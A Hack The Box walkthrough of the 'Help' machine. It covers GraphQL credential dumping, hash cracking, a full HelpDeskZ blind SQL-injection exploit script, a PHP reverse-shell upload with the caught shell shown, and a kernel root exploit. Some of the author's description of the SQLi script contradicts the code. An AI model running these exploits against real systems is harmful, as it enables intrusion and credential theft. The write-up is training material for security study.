---
{"dg-publish":true,"permalink":"/ct-fs/htb/help/","dgShowFileTree":true,"dg-note-properties":{}}
---

#linux #sqlinjection #kernel_exploit #password #john

# By: 0xCapra_Daemon aka Will Keller

## Contents:
[[CTFs/HTB/Help#Recon\|#Recon]]
[[CTFs/HTB/Help#Initial Foothold\|#Initial Foothold]]
[[CTFs/HTB/Help#Privilege Escalation\|#Privilege Escalation]]
[[CTFs/HTB/Help#Takeaways\|#Takeaways]]


## Recon

![Pasted image 20260715234422.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260715234422.png)
```zsh
------------------------------------------------------------
        Threader 3000 - Multi-threaded Port Scanner          
                       Version 1.0.7                    
                   A project by The Mayor               
------------------------------------------------------------
Enter your target IP address or URL here: 10.129.230.159
------------------------------------------------------------
Scanning target 10.129.230.159
Time started: 2026-07-16 02:45:12.146570
------------------------------------------------------------
Port 22 is open
Port 80 is open
Port 3000 is open
Port scan completed in 0:00:33.612999
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p22,80,3000 -sV -sC -T4 -Pn -oA 10.129.230.159 10.129.230.159
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p22,80,3000 -sV -sC -T4 -Pn -oA 10.129.230.159 10.129.230.159
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 02:45 -0400
Nmap scan report for 10.129.230.159
Host is up (0.089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://help.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.30 seconds
------------------------------------------------------------

```
Initial scans reveal `ssh`, `apache2` and `Node.js Express` running on ports `22` `80` and `3000` respectively. I'll also add `help.htb` to `/etc/hosts` under our target IP address. This immediately makes me think we'll be enumerating subdomains/vhosts on this server.

![Pasted image 20260715235125.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260715235125.png)
visiting the `index` of the `Apache2` reveals the `Apache2` default page. Further enumeration required.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/help/scanning]
└─$ gobuster dir -u http://help.htb -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,css,js,txt,png,jpg,zip,bak,old -t 20 --exclude-length 292,291 | tee ./gobuster_80
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://help.htb
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          292,291
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,css,js,txt,png,jpg,zip,bak,old
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.php                 (Status: 403) [Size: 287]
.html                (Status: 403) [Size: 288]
.html.html           (Status: 403) [Size: 293]
index.html           (Status: 200) [Size: 11321]
.htm                 (Status: 403) [Size: 287]
.htm.js              (Status: 403) [Size: 290]
javascript           (Status: 301) [Size: 309] [--> http://help.htb/javascript/]
support              (Status: 301) [Size: 306] [--> http://help.htb/support/]
.                    (Status: 200) [Size: 11321]
.htaccess.txt        (Status: 403) [Size: 296]
.htaccess.png        (Status: 403) [Size: 296]
.htaccess.jpg        (Status: 403) [Size: 296]
.htaccess.bak        (Status: 403) [Size: 296]
.htaccess.zip        (Status: 403) [Size: 296]
.htaccess.old        (Status: 403) [Size: 296]
.htaccess.html       (Status: 403) [Size: 297]
.htaccess.php        (Status: 403) [Size: 296]
.htaccess.css        (Status: 403) [Size: 296]
.htaccess.js         (Status: 403) [Size: 295]
.php3                (Status: 403) [Size: 288]
.phtml               (Status: 403) [Size: 289]
.htc                 (Status: 403) [Size: 287]
.htc.js              (Status: 403) [Size: 290]
.php5                (Status: 403) [Size: 288
```
Gobuster scan of the `Apache2` server reveal a subdirectory called `support`.

![Pasted image 20260715235701.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260715235701.png)
This renders as a Helpdesk platform called `HelpDeskZ`. 

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/help/scanning]
└─$ gobuster dir -u http://help.htb/support -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -x php,html,css,js,txt,png,jpg,zip,bak,old -t 20 --exclude-length 292,291 | tee ./gobuster_support
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://help.htb/support
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] Exclude Length:          292,291
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              js,zip,bak,html,txt,png,jpg,old,php,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.php                 (Status: 403) [Size: 295]
images               (Status: 301) [Size: 313] [--> http://help.htb/support/images/]
includes             (Status: 301) [Size: 315] [--> http://help.htb/support/includes/]
.html.png            (Status: 403) [Size: 300]
.html                (Status: 403) [Size: 296]
.html.txt            (Status: 403) [Size: 300]
.html.jpg            (Status: 403) [Size: 300]
.html.old            (Status: 403) [Size: 300]
.html.php            (Status: 403) [Size: 300]
.html.css            (Status: 403) [Size: 300]
.html.js             (Status: 403) [Size: 299]
.html.bak            (Status: 403) [Size: 300]
.html.html           (Status: 403) [Size: 301]
.html.zip            (Status: 403) [Size: 300]
js                   (Status: 301) [Size: 309] [--> http://help.htb/support/js/]
index.php            (Status: 200) [Size: 4413]
css                  (Status: 301) [Size: 310] [--> http://help.htb/support/css/]
.htm                 (Status: 403) [Size: 295]
.htm.html            (Status: 403) [Size: 300]
.htm.txt             (Status: 403) [Size: 299]
.htm.png             (Status: 403) [Size: 299]
.htm.jpg             (Status: 403) [Size: 299]
.htm.old             (Status: 403) [Size: 299]
.htm.php             (Status: 403) [Size: 299]
.htm.zip             (Status: 403) [Size: 299]
.htm.css             (Status: 403) [Size: 299]
.htm.js              (Status: 403) [Size: 298]
.htm.bak             (Status: 403) [Size: 299]
LICENSE.txt          (Status: 200) [Size: 18092]
uploads              (Status: 301) [Size: 314] [--> http://help.htb/support/uploads/]
captcha.php          (Status: 200) [Size: 2907]
.                    (Status: 200) [Size: 4413]
readme.html          (Status: 200) [Size: 7509]
.htaccess            (Status: 403) [Size: 300]
.htaccess.css        (Status: 403) [Size: 304]
.htaccess.php        (Status: 403) [Size: 304]
.htaccess.html       (Status: 403) [Size: 305]
.htaccess.zip        (Status: 403) [Size: 304]
.htaccess.js         (Status: 403) [Size: 303]
.htaccess.txt        (Status: 403) [Size: 304]
.htaccess.bak        (Status: 403) [Size: 304]
.htaccess.png        (Status: 403) [Size: 304]
.htaccess.jpg        (Status: 403) [Size: 304]
.htaccess.old        (Status: 403) [Size: 304]
views                (Status: 301) [Size: 312] [--> http://help.htb/support/views/]
.php3                (Status: 403) [Size: 296]
.phtml               (Status: 403) [Size: 297]
controllers          (Status: 301) [Size: 318] [--> http://help.htb/support/controllers/]
.htc                 (Status: 403) [Size: 295]
.htc.html            (Status: 403) [Size: 300]
.htc.old             (Status: 403) [Size: 299]
.htc.php             (Status: 403) [Size: 299]
.htc.bak             (Status: 403) [Size: 299]
.htc.css             (Status: 403) [Size: 299]
.htc.jpg             (Status: 403) [Size: 299]
.htc.zip             (Status: 403) [Size: 299]
.htc.js              (Status: 403) [Size: 298]
.htc.txt             (Status: 403) [Size: 299]
.htc.png             (Status: 403) [Size: 299]

```
Secondary gobuster for `support` revealed several subdirectories which gave redirects. When followed they immediately redirect back to the `Apache2` default page. However, this may only happen in a browser session for those URLs.

![Pasted image 20260716000345.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716000345.png)
After Googling ways to discover the version number of `HelpDeskZ` I was able to leak it via `/support/README.md`.

![Pasted image 20260716000554.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716000554.png)
Found PoC for an arbitrary file upload vuln for our version of `HelpDeskZ`.

![Pasted image 20260716001813.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716001813.png)
From the instructions in the script, we must first submit a ticket with a malicious file. In our case we chose a `PHP` reverse shell. However, when first attempting to upload it normally the system didn't like the file extension so we double barreled it behind a `.jpg` extension

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/help/exploit]
└─$ python2 exploit.py http://help.htb/support revshell.php.jpg
http://help.htb/support/uploads/tickets/f1bc1e59775a43ebb7c7cd9807a943b9.jpg

```
Running the script it gives us the hashed subdirectory where our upload was placed.

![Pasted image 20260716003847.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716003847.png)
Visiting this page tries to render our `.jpg` but since it's a double-barreled PHP file it doesn't load properly. The server also doesn't execute the PHP as a result.


![Pasted image 20260716132533.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716132533.png)
While thinking of ways to glean the source for `HelpDeskZ`, I pivot in workflow to check out the service running on `port 3000`. Wappalyzer shows it to be a Nodejs app with the express framework on the front end.

![Pasted image 20260716133126.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716133126.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/help/scanning]
└─$ gobuster dir -u http://help.htb:3000/ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -x php,html,py,txt,css,js -t 20| tee ./gobuster_3000 
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://help.htb:3000/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              php,html,py,txt,css,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
graphql              (Status: 400) [Size: 18]
===============================================================
Finished
===============================================================
```
After several unsuccessful attempts at enumerating subdirectories on the app with generic wordlists I decide to try an api based wordlist and found one `graphql`. This will inform us what kind of query that was mentioned in the webroot. 

![Pasted image 20260716133615.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716133615.png)
A quick google search leads me to an article describing the proper parameter(s) needed to send a `graphql` GET request query.

![Pasted image 20260716134739.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716134739.png)
![Pasted image 20260716134843.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716134843.png)
From there we start piecing together the specific query items one by one. The output from the app lets us know what parameter it expects next.

![Pasted image 20260716135310.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716135310.png)
Finally land on what looks like a fuzz-able query.

![Pasted image 20260716140436.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716140436.png)
After several unsuccessful fuzzes I go back to google and find that there's a universal `schema` field type in GraphQL just like other common SQL products. This can be used to evaluate the architecture of the db. 

![Pasted image 20260716142508.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716142508.png)
More googling eventually revealed a oneliner to query the schema of the application and we find an object called `user` which is the same type as `__schema` which indicates its a table. We then see two scalars called `username` and password. These appear to be the fields in the table that we want theoretically.


> [!NOTE] Query
> `(http://help.htb:3000/graphql?query=query{%20__schema{%20types{name%20kind%20fields{name%20type{name%20kind%20ofType{%20name}}}}}})`




![Pasted image 20260716142731.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716142731.png)
With that in mind, I sent off the query `http://help.htb:3000/graphql?query=query{user{username password}}` and we successfully dump a set of creds for user `helpme@helpme.com` and a password hash (appears to be an `md5` hash.)


```zsh
┌──(kali㉿kali)-[~/…/HTB/help/exploit/graphql]
└─$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
godhelpmeplz     (?)     
1g 0:00:00:00 DONE (2026-07-16 17:32) 4.166g/s 32657Kp/s 32657Kc/s 32657KC/s godiamond11213..godessisis
Use the "--show --
```
Moved the hash offline and cracked with `john` .

![Pasted image 20260716143522.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716143522.png)
![Pasted image 20260716143541.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716143541.png)
I took our newly minted set of creds back over to the app on `port 80` and successfully logged into the helpdeskz platform.

![Pasted image 20260716145048.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260716145048.png)
even authenticated to the app we weren't able to upload our payload properly. Further enumeration revealed a `readme.html` endpoint which let us know of a `staff` login portal at `http://help.htb/support?v=staff`. However the password policy gives you three guesses every five minutes. After several attempts there was no successful auth to that backend.

## Initial Foothold

![Pasted image 20260717215646.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260717215646.png)
Found another CVE for `HelpDeskZ < 1.0.2` after checking htb hint for this section.

```python
'''
# Exploit Title: HelpDeskZ <= v1.0.2 - Authenticated SQL Injection / Unauthorized file download
# Google Dork: intext:"Help Desk Software by HelpDeskZ", inurl:?v=submit_ticket
# Date: 2017-01-30
# Exploit Author: Mariusz Popławski, kontakt@deepsec.pl ( www.afine.pl )
# Vendor Homepage: http://www.helpdeskz.com/
# Software Link: https://github.com/evolutionscript/HelpDeskZ-1.0/archive/master.zip
# Version: <= v1.0.2
# Tested on:
# CVE :
 
HelpDeskZ <= v1.0.2 suffers from an sql injection vulnerability that allow to retrieve administrator access data, and download unauthorized attachments.
 
Software after ticket submit allow to download attachment by entering following link:
http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1(ATTACHMENT_ID_HERE)

FILE: view_tickets_controller.php
LINE 95:	$attachment = $db->fetchRow("SELECT *, COUNT(id) AS total FROM ".TABLE_PREFIX."attachments WHERE id=".$db->real_escape_string($params[2])." AND ticket_id=".$params[0]." AND msg_id=".$params[3]);

third argument AND msg_id=".$params[3]; sent to fetchRow query with out any senitization

 
Steps to reproduce:
 
http://127.0.0.1/helpdeskz/?/?v=view_tickets&action=ticket&param[]=2(VALID_TICKET_ID_HERE)&param[]=attachment&param[]=1&param[]=1 or id>0 -- -


by entering a valid id of param[] which is our submited ticket id and adding our query on the end of request we are able to download any uploaded attachment.
 
Call this script with the base url of your HelpdeskZ-Installation and put your submited ticket login data (EMAIL, PASSWORD)

steps:
1. go to http://192.168.100.115/helpdesk/?v=submit_ticket
2. Submit a ticket with valid email (important we need password access).
3. Add attachment to our ticket (important step as the attachment table may be empty, we need at least 1 attachment in db to valid our query).
4. Get the password from email.
5. run script

root@kali:~/Desktop# python test.py http://192.168.100.115/helpdesk/ localhost@localhost.com password123

where http://192.168.100.115/helpdesk/ = base url to helpdesk
localhost@localhost.com = email which we use to submit the ticket
password123 = password that system sent to our email

Output of script:
root@kali:~/Desktop# python test.py http://192.168.100.115/helpdesk localhost@localhost.com password123
2017-01-30T09:50:16.426076   GET   http://192.168.100.115/helpdesk
2017-01-30T09:50:16.429116   GET   http://192.168.100.115/helpdesk/
2017-01-30T09:50:16.550654   POST   http://192.168.100.115/helpdesk/?v=login
2017-01-30T09:50:16.575227   GET   http://192.168.100.115/helpdesk/?v=view_tickets
2017-01-30T09:50:16.674929   GET   http://192.168.100.115/helpdesk?v=view_tickets&action=ticket&param[]=6&param[]=attachment&param[]=1&param[]=1%20or%201=1%20and%20ascii(substr((SeLeCt%20table_name%20from%20information_schema.columns%20where%20table_name%20like%20'%staff'%20%20limit%200,1),1,1))%20=%20%2047%20--%20-
...
------------------------------------------
username: admin
password: sha256(53874ea55571329c04b6998d9c7772c9274d3781)

'''           
import requests
import sys

if( len(sys.argv) < 3):
	print "put proper data like in example, remember to open a ticket before.... "
	print "python helpdesk.py http://192.168.43.162/helpdesk/ myemailtologin@gmail.com password123"
	exit()
EMAIL = sys.argv[2]
PASSWORD = sys.argv[3]

URL = sys.argv[1]

def get_token(content):
	token = content
	if "csrfhash" not in token:
		return "error"
	token = token[token.find('csrfhash" value="'):len(token)]
	if '" />' in token:
		token = token[token.find('value="')+7:token.find('" />')] 
	else:
		token = token[token.find('value="')+7:token.find('"/>')] 
	return token

def get_ticket_id(content):
	ticketid = content
	if "param[]=" not in ticketid:
                return "error"
	ticketid = ticketid[ticketid.find('param[]='):len(ticketid)]
	ticketid = ticketid[8:ticketid.find('"')]
	return ticketid


def main():

    # Start a session so we can have persistant cookies
	session = requests.session(config={'verbose': sys.stderr})

	r = session.get(URL+"")
	
	#GET THE TOKEN TO LOGIN
        TOKEN = get_token(r.content)
	if(TOKEN=="error"):
		print "cannot find token"
		exit();
    #Data for login 
	login_data = {
		'do': 'login',
		'csrfhash': TOKEN,
		'email': EMAIL,
		'password': PASSWORD,
		'btn': 'Login'
	}

    # Authenticate
	r = session.post(URL+"/?v=login", data=login_data)
    #GET  ticketid
	ticket_id = get_ticket_id(r.content)
        if(ticket_id=="error"):
                print "ticketid not found, open a ticket first"
		exit()
	target = URL +"?v=view_tickets&action=ticket&param[]="+ticket_id+"&param[]=attachment&param[]=1&param[]=1"

	limit = 1
        char = 47
        prefix=[]
        while(char!=123):
                target_prefix = target+ " or 1=1 and ascii(substr((SeLeCt table_name from information_schema.columns where table_name like '%staff'  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
                response = session.get(target_prefix).content
                if "couldn't find" not in response:
                        prefix.append(char)
                        limit=limit+1
                        char=47
                else:
                        char=char+1
	table_prefix = ''.join(chr(i) for i in prefix)
	table_prefix = table_prefix[0:table_prefix.find('staff')]
	
	limit = 1
	char = 47
	admin_u=[]
	while(char!=123):
		target_username = target+ " or 1=1 and ascii(substr((SeLeCt username from "+table_prefix+"staff  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
		response = session.get(target_username).content
		if "couldn't find" not in response:
			admin_u.append(char)
			limit=limit+1
			char=47
		else:
			char=char+1

        limit = 1
        char = 47
        admin_pw=[]
        while(char!=123):
                target_password = target+ " or 1=1 and ascii(substr((SeLeCt password from "+table_prefix+"staff  limit 0,1),"+str(limit)+",1)) =  "+str(char)+" -- -"
                response = session.get(target_password).content
                if "couldn't find" not in response:
                        admin_pw.append(char)
                        limit=limit+1
                        char=47
                else:
                        char=char+1


	admin_username = ''.join(chr(i) for i in admin_u)
	admin_password = ''.join(chr(i) for i in admin_pw)

	print "------------------------------------------"
	print "username: "+admin_username
	print "password: sha256("+admin_password+")"
	if admin_username==""  and  admin_password=='':
		print "Your ticket have to include attachment, probably none atachments found, or prefix is not equal hdz_"
		print "try to submit ticket with attachment"
if __name__ == '__main__':
    main()
            
```
This script should allow us to drop any tables on the machine by exploiting a blind SQL Injection in the `remember` POST parameter of the login form.

![Pasted image 20260717220609.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260717220609.png)
The script instructs us to submit a ticket that has an attachment (so the table isn't empty for the ticket) under a user we have authentication with: `helpme@helpme.com:godhelpmeplz`

```zsh
python2 sql.py
Password: d 
Password: d3 
Password: d31 
---------------------- SNIP ---------------------- 
Password: d318f44739d 
Password: d318f44739dc 
Password: d318f44739dce 
Password: d318f44739dced 
Password: d318f44739dced6 
Password: d318f44739dced66 
---------------------- SNIP ---------------------- 
Password: d318f44739dced66793b1a603028 
Password: d318f44739dced66793b1a6030281 
Password: d318f44739dced66793b1a60302813 
---------------------- SNIP ---------------------- 
Password: d318f44739dced66793b1a603028133a76ae68 
Password: d318f44739dced66793b1a603028133a76ae680 
Password: d318f44739dced66793b1a603028133a76ae680e
```
Script eventually ouputs the hash for the user `admin`.

```zsh
john --wordlist=/usr/share/wordlists/rockyou.txt admin.txt 
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Welcome1         (?)     
1g 0:00:00:00 DONE (2026-07-18 01:56) 33.33g/s 1346Kp/s 1346Kc/s 1346KC/s abygail..Thomas1
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed
```
We immediately crack it in `john` to reveal the password as: `Welcome1`

![Pasted image 20260717225838.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260717225838.png)
We are now able to authenticate as `admin` user on the `v=staff` parameter page. We see an even more elevated ticketing session.

![Pasted image 20260717230230.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260717230230.png)
With our admin session we are able to edit file extension settings to now allow php uploads.

```zsh
python3 exploit.py http://help.htb/support/ rev.php
http://help.htb/support/uploads/tickets/d7ed43d18a4b4fe72fb411c265238397.php
```
from there we uploaded a php reverse shell in an anonymous session by submitting a ticket with that attached unauthenticated. We dump it's location with the CVE script we found earlier in reference to this upload vuln.

![Pasted image 20260717231335.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260717231335.png)
```zsh
nc -lnvp 8888            
listening on [any] 8888 ...
connect to [10.10.14.192] from (UNKNOWN) [10.129.62.30] 48230
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 23:09:20 up 49 min,  0 users,  load average: 0.04, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
help
```
Successfully caught reverse shell (finally) for our foothold gained for user `help`.

```ssh help@help.htb
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
help@help.htb's password: 
Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
You have new mail.
Last login: Fri Jul 17 23:18:16 2026 from 10.10.14.192
help@help:~$ 
```
Attempted password reuse for possible ssh and confirmed user `help` on this machine's password is `Welcome1`

## Privilege Escalation

```zsh
help@help:~$ uname -a
Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
help@help:~$ nano lpe.c
help@help:~$ which gcc
/usr/bin/gcc
help@help:~$ gcc -o lpe lpe.c
help@help:~$ ls
total 84K
4.0K drwxr-xr-x   7 help help 4.0K Jul 17 23:22 .
4.0K drwxr-xr-x   3 root root 4.0K Dec 13  2023 ..
   0 lrwxrwxrwx   1 root root    9 Dec 18  2023 .bash_history -> /dev/null
4.0K -rw-r--r--   1 help help  220 Nov 27  2018 .bash_logout
4.0K -rw-r--r--   1 help help    1 Nov 27  2018 .bash_profile
4.0K -rw-r--r--   1 help help 3.7K Nov 27  2018 .bashrc
4.0K drwx------   2 help help 4.0K Nov 23  2021 .cache
4.0K drwxr-xr-x   4 help help 4.0K Dec 13  2023 .forever
4.0K drwxrwxrwx   6 help help 4.0K May  4  2022 help
 16K -rwxrwxr-x   1 help help  14K Jul 17 23:22 lpe
8.0K -rw-rw-r--   1 help help 5.7K Jul 17 23:22 lpe.c
4.0K drwxrwxr-x   2 help help 4.0K Nov 23  2021 .nano
 12K drwxrwxr-x 290 help help  12K Dec 13  2023 .npm
4.0K -rw-rw-r--   1 help help    1 May  4  2022 npm-debug.log
4.0K -rw-r--r--   1 help help  655 Nov 27  2018 .profile
4.0K -rw-r--r--   1 help help   33 Jul 17 22:19 user.txt
help@help:~$ ./lpe
task_struct = ffff88003e3f6200
uidptr = ffff88003d911184
spawning root shell
root@help:~# whoami
root
```
![Pasted image 20260717232626.png](/img/user/CTFs/HTB/Images/Help%20Images/Pasted%20image%2020260717232626.png)
Searched kernel version exploit online to find one on exploit-db. Copied script to target machine as `lpe.c` compiled with gcc as executable `lpe` and ran it. Root shell immediately spawned. Pwned.

## Takeaways
- Learn more about sql injection (blind, 2nd order, etc.)
- look for password reuse opportunities
- Beware rabbit holes. Make sure you take time to research **each** vuln listed for **each** service possible.
- Sometimes scripts you find online won't work even though you do the syntax correctly. IDK what's up with that
- When doing LPE always check for a kernel exploit first. They're usually just run and get root and a pretty easy vector to overlook.
- Check if GET and POST params are injectable with sql injection.
- Enumerate enumerate **ENUMERATE** Gah dammit
[[CTFs/HTB/Help#Contents\|Back to Top]]
